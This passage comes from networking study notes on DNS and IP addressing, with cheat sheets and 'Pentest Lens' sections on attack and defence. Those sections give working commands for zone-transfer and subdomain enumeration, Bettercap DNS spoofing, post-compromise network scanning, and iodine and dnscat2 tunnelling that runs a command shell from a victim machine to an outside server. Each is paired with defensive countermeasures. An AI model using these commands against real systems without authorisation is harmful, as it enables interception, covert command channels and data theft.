# Check if a domain is DNSSEC-signed
dig +dnssec www.cloudflare.com    # Look for RRSIG records in the answer
dig DS google.com                  # Delegation Signer record
```

### Pentest Lens — DNS

**Attacker's view**: DNS is a goldmine for reconnaissance. It reveals infrastructure, mail providers, CDN usage, and internal hostnames. It's also a vector for MITM, credential capture, and data exfiltration (DNS tunnelling).

**Enumeration**:
```bash
# Zone transfer attempt (AXFR) — dumps all DNS records if server misconfigured
dig axfr @ns1.example.com example.com
# If allowed: you get every hostname, IP, MX, SRV record in the zone

# Subdomain enumeration using wordlist brute force
# dnsx — fast DNS resolver
cat wordlist.txt | dnsx -d example.com -a -resp

# dnsrecon — comprehensive DNS recon
dnsrecon -d example.com -t std       # Standard record enum
dnsrecon -d example.com -t axfr      # Zone transfer attempt
dnsrecon -d example.com -t brt -D /usr/share/dnsrecon/namelist.txt  # Brute force

# fierce — DNS scanner
fierce --domain example.com

# Shodan for DNS history — find IPs that previously resolved to the domain
# (useful for finding origin IP behind Cloudflare CDN)
# Browse: https://www.shodan.io/search?query=hostname:example.com
```

**DNS Poisoning / Spoofing**:
An attacker intercepts a DNS query and sends a forged response before the legitimate server can. The victim's resolver caches the forged IP, redirecting them to the attacker's server.

```bash
# MITM position required — then use:
# Bettercap DNS spoofing
bettercap -iface eth0
> net.probe on
> set dns.spoof.domains example.com
> set dns.spoof.address 192.168.1.99    # Attacker's IP
> dns.spoof on
```

**DNS-based C2 and Data Exfiltration (DNS Tunnelling)**:
Data can be encoded in DNS queries and responses, tunnelling through firewalls that allow DNS.

```bash
# iodine — full IP tunnel over DNS
# Server side (internet-accessible)
iodined -f -c -P password 10.0.0.1 tunnel.example.com

# Client side (inside restricted network)
iodine -f -P password tunnel.example.com
# Creates a tun interface — can now route all traffic through DNS

# dnscat2 — command shell over DNS (no full tunnel)
# Server
ruby dnscat2.rb tunnel.example.com --secret=password

# Client (on victim machine)
./dnscat --dns server=ns1.example.com,port=53 --secret=password
```

**Internal DNS — Active Directory**:
```bash
# Once inside a Windows network, query internal DNS for AD info
nslookup -type=SRV _ldap._tcp.dc._msdcs.corp.local
nslookup -type=SRV _kerberos._tcp.corp.local
nslookup -type=SRV _gc._tcp.corp.local

# These reveal Domain Controller hostnames — primary targets in an AD engagement
```

**Misconfigurations to look for**:
- Zone transfers permitted to any host (AXFR open) — exposes full internal DNS
- Internal DNS server accessible from the internet — leaks internal hostnames
- No DNSSEC — DNS responses can be poisoned
- Wildcard DNS records — `*.example.com → x.x.x.x` — can mask subdomain enumeration
- DNS admin interface (BIND rndc, Windows DNS console via WMI) exposed

**DNS Rebinding Attack**:
An attacker's domain initially resolves to a legitimate IP (bypassing Same-Origin Policy in browsers), then the TTL expires and rebinds to an internal IP (e.g., 192.168.1.1). The browser then makes requests to the internal IP, thinking it's still the attacker's domain. Used to bypass browser SOP and access internal admin interfaces.

**Defender's counter**:
- Restrict zone transfers to authorised secondary DNS servers only (`allow-transfer { <secondary-IP>; };` in BIND)
- Enable DNSSEC for external zones
- Implement DNS over HTTPS (DoH) or DNS over TLS (DoT) for client queries
- Block outbound DNS (UDP/TCP 53) to all except authorised DNS servers — prevents DNS tunnelling
- Monitor for anomalous DNS query volume (tunnelling generates many queries)
- Split-horizon DNS: internal DNS zone separate from external, no internal hostnames exposed externally

---

## 9. ipcalc, dig, and DNS/IP Tools Reference

```bash
# ipcalc — subnet calculator
ipcalc 192.168.1.130/26
# Output: Network, Broadcast, First/Last host, Hostmin, Hostmax, Hosts/Net

# Install on Debian/Ubuntu
apt install ipcalc

# sipcalc — more detailed
sipcalc 192.168.10.50/22

# Netmask tool
netmask 192.168.1.0/24

# Python one-liner subnet info
python3 -c "import ipaddress; n=ipaddress.ip_network('192.168.1.0/26'); print(n.network_address, n.broadcast_address, list(n.hosts())[0], list(n.hosts())[-1])"

# ip command (Linux — modern replacement for ifconfig)
ip addr show                     # All interfaces and their IPs
ip route show                    # Routing table
ip neigh show                    # ARP/NDP table (neighbour cache)
ip link show                     # Interface state

# Windows
ipconfig /all                    # IP config for all adapters
ipconfig /displaydns             # Show DNS cache
ipconfig /flushdns               # Clear DNS cache
nslookup -type=A example.com 8.8.8.8
route print                      # Routing table
arp -a                           # ARP cache
```

---

## Pentest Lens — IP Addressing (Consolidated)

### Pentest Lens

**Attacker's view — IP addressing reconnaissance**:

Understanding IP addressing lets you map the target's network, identify subnets, find hosts, and plan lateral movement.

**External reconnaissance**:
```bash
# Identify IP ranges owned by the target organisation
whois <target-domain>           # ASN, netblocks
whois <target-IP>               # Who owns this IP range

# BGP routing data
curl https://bgpview.io/ip/<target-IP>    # AS info, prefix

# Shodan — find internet-exposed assets
# shodan.io/search?query=org:"Target Company Name"
# Finds all IPs, ports, banners attributed to the organisation

# Certificate transparency — find all subdomains (and thus IPs)
curl "https://crt.sh/?q=%.example.com&output=json"
```

**Internal reconnaissance — post-compromise**:
```bash
# What network am I on?
ip a                             # Linux
ipconfig /all                    # Windows

# What's my gateway? (The next hop — often a firewall or router)
ip route show default            # Linux
route print                      # Windows

# What other hosts are on my subnet?
# ICMP ping sweep (noisy)
nmap -sn 192.168.1.0/24

# ARP scan (Layer 2 — finds hosts that block ICMP)
arp-scan --localnet              # Linux
nmap -sn -PR 192.168.1.0/24    # ARP ping

# What other subnets can I reach?
# Check routing table — are there routes to other internal subnets?
ip route show
# If 10.10.0.0/16 is reachable via the gateway, there's a larger internal network

# Check ARP cache — reveals hosts that have recently communicated
arp -a                           # Both Linux and Windows
ip neigh show                    # Linux alternative
```

**APIPA (169.254.x.x) — Pentest Significance**:
If a target has a 169.254.x.x address, DHCP failed. This means:
- The device may not be able to communicate beyond the local segment
- It suggests a DHCP server problem — potential attack vector (rogue DHCP)
- The device may still be reachable on the local link

**IPv6 — Don't Ignore It**:
```bash
# Check for IPv6 on the local network
ip -6 addr show                  # Linux — see link-local and global IPv6
ip -6 neigh show                 # IPv6 neighbour cache (like ARP for IPv6)

# Scan for IPv6 hosts on link-local (all nodes multicast)
ping6 ff02::1%eth0               # Ping all-nodes multicast on eth0
nmap -6 -sn fe80::/10            # Not practical — link-local space is huge

# Tool: alive6 (from thc-ipv6 toolkit)
alive6 eth0                      # Discover active IPv6 hosts on the segment
```

**Misconfigurations**:
- Flat network with one large subnet (e.g., /16 or /20 for all users) — one compromised host can ARP-scan all others
- Inconsistent RFC 1918 range reuse (e.g., 192.168.1.0/24 used both internally and for a VPN) — routing conflicts, connectivity issues
- IPv6 active but unfirewalled
- APIPA addresses on servers — indicates DHCP dependency on infrastructure not in scope

**Defender's counter**:
- Micro-segmentation: each function in its own VLAN and subnet, firewall between them
- Apply IPv6 ACLs equivalent to IPv4 ACLs on all firewalls and switches
- Monitor for unexpected subnets appearing in ARP tables or routing tables (may indicate rogue device or VLAN hopping)

---

## Quick Reference — Module 1

### CIDR / Subnet Mask Cheat Sheet
| CIDR | Mask | Block Size | Usable Hosts |
|------|------|-----------|-------------|
| /24 | 255.255.255.0 | 256 | 254 |
| /25 | 255.255.255.128 | 128 | 126 |
| /26 | 255.255.255.192 | 64 | 62 |
| /27 | 255.255.255.224 | 32 | 30 |
| /28 | 255.255.255.240 | 16 | 14 |
| /29 | 255.255.255.248 | 8 | 6 |
| /30 | 255.255.255.252 | 4 | 2 |
| /32 | 255.255.255.255 | 1 | 1 (host route) |
| /23 | 255.255.254.0 | 512 | 510 |
| /22 | 255.255.252.0 | 1024 | 1022 |
| /21 | 255.255.248.0 | 2048 | 2046 |
| /20 | 255.255.240.0 | 4096 | 4094 |
| /16 | 255.255.0.0 | 65536 | 65534 |
| /8  | 255.0.0.0 | 16777216 | 16777214 |

### Private IP Ranges
| Range | CIDR | Class |
|-------|------|-------|
| 10.0.0.0 – 10.255.255.255 | /8 | A |
| 172.16.0.0 – 172.31.255.255 | /12 | B |
| 192.168.0.0 – 192.168.255.255 | /16 | C |

### DNS Record Types
| Type | Purpose |
|------|---------|
| A | Hostname → IPv4 |
| AAAA | Hostname → IPv6 |
| CNAME | Alias |
| MX | Mail server |
| NS | Authoritative name server |
| PTR | IP → Hostname |
| TXT | SPF, DKIM, verification |
| SRV | Service location |
| SOA | Zone authority |

### Key DNS/IP Commands
```bash
dig example.com A                   # A record
dig example.com MX                  # Mail servers
dig axfr @ns1.example.com example.com  # Zone transfer
nmap -sn 192.168.1.0/24             # Host discovery
arp-scan --localnet                  # Layer 2 host discovery
ipcalc 192.168.1.130/26             # Subnet calculator
ip route show                        # Routing table (Linux)
```

### DHCP Ports
| Direction | Source Port | Destination Port |
|-----------|------------|-----------------|
| Client → Server | 68 | 67 |
| Server → Client | 67 | 68 |

---

## Related Notes
- [[Module-00-Foundations]] — OSI Model, binary/hex conversions, network types
- [[Module-02-Devices-Infrastructure]] — Routers, switches, VLANs use subnets and IP addressing
- [[Module-03-Protocols-Deep-Dive]] — TCP, UDP, ICMP, ARP operate at Layer 3/4
- [[Module-04-Network-Security]] — DHCP snooping, DNS security controls
- [[Module-07-Windows-Server-Networking]] — Windows DHCP server, AD-integrated DNS
- [[Module-12-Pentest-Perspective]] — Subnet enumeration, DNS recon in engagements
